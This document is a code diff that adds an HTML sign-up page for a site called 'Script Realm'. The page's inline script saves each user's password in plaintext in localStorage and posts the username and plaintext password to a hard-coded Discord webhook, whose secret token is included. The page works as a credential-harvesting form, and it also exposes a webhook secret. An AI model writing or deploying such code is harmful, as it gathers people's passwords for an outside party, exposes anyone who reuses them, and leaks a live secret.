@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Sign up</title>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <form id="signup-form">
+                <div class="header">
+                    <div class="title">Sign up to Script Realm</div>
+                    <div class="subtitle">ⓘ Your username should have "Admin" in it, else your username will be renamed.</div>
+                </div>
+                <div class="input-group">
+                    <div class="label">Username</div>
+                    <input type="text" name="name" id="name" placeholder="Enter Your Username" autocomplete="name" required>
+                </div>
+                <div class="input-group">
+                    <div class="label">Password</div>
+                    <input type="password" name="password" id="password" placeholder="Enter Your Password" autocomplete="current-password" required>
+                </div>
+                <button type="submit" class="submit-btn">Create Account</button>
+                <div class="signin">
+                    Already have an account? <a href="signin.html"><button type="button" class="signin-btn">Sign in</button></a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script>
+        document.getElementById('signup-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Get form values
+            const username = document.getElementById('name').value;
+            const password = document.getElementById('password').value;
+
+            // Save to localStorage
+            localStorage.setItem('username', username);
+            localStorage.setItem('password', password);
+
+            // Check if username contains 'Admin'
+            let finalUsername = username;
+            if (!username.includes('Admin')) {
+                finalUsername = 'Admin' + username;
+            }
+
+            // Prepare data for Discord webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1263962096568369162/ODn2-KV_yWfuOgw5XVrXaZBe7sVJGmYJyiTMycvpV1qszZff0P0gdDr3BFFJf_cZ0rwR';
+            const data = {
+                content: `New signup:\nUsername: ${finalUsername}\nPassword: ${password}`
+            };
+
+            // Send data to Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Sign up successful and data sent to Discord!');
+                } else {
+                    alert('Error sending data to Discord.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending data to Discord.');
+            });
+        });
+    </script>
+</body>
+</html>
